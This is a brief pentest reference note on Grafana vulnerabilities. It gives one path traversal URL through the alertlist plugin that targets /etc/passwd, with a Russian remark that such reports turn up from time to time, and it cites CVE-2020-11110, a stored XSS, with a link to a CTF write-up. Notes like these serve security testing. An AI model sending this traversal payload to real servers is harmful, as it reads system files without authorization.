# Grafana

## Known vulnerabilities

### LFI / Path Traversal

```
https://grafana.example.org/plugins/alertlist/../../../../../../../../../etc/passwd

Как определяется путь не знаю, но периодически такие репорты появляются
```

## CVEs

CVE-2020-11110 Stored XSS Auth not required: [https://ctf-writeup.revers3c.com/challenges/web/CVE-2020-11110/index.html](https://ctf-writeup.revers3c.com/challenges/web/CVE-2020-11110/index.html)
